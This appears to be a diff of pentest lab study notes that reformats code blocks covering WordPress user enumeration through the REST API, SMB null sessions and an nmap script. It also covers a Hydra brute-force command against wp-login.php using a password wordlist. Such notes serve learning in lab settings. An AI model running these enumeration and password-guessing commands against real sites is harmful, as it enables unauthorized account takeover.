@@ -139,15 +139,15 @@ curl -s http://TARGET/wp-json/wp/v2/users | jq '.[].slug'
 #### B. SMB-based (Port 445 – If OS Users Overlap with WP)
 - If WP users are also OS users (common in simple labs)
   1. **Null session enum**:
-     ```bash
-     smbclient -L //TARGET -N
-     rpcclient -U "" -N TARGET -c "enumdomusers"
-     ```
+```bash
+smbclient -L //TARGET -N
+rpcclient -U "" -N TARGET -c "enumdomusers"
+```
 
 #### C. Nmap Script
-  ```bash
-  nmap -p80 --script http-wordpress-users TARGET
-  ```
+```bash
+nmap -p80 --script http-wordpress-users TARGET
+```
 
 ## 3. Hydra WordPress Brute-Force Needs Flag Like HTTP Post Form? (Lab Didn't Use It)
 
@@ -163,11 +163,11 @@ No, Hydra doesn't always need a "flag" (failure string) for WordPress brute-forc
 - **For WP specifically**:
   - WP login form returns "ERROR: The password you entered for the username X is incorrect" on failure.
   - So **use a flag** for reliability:
-    ```bash
-    hydra -l admin -P rockyou.txt TARGET http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" -V
-    
-    #Put failure text in F= not id or name
-    ```
+```bash
+hydra -l admin -P rockyou.txt TARGET http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" -V
+  
+#Put failure text in F= not id or name
+```
   - If the lab didn't use it → their form had a clear success redirect (e.g., 302 to dashboard), so Hydra detected it without a flag.
 
 **Notes tip**: Always use failure flag for precision — test manually with wrong creds first to find the exact "incorrect" string.
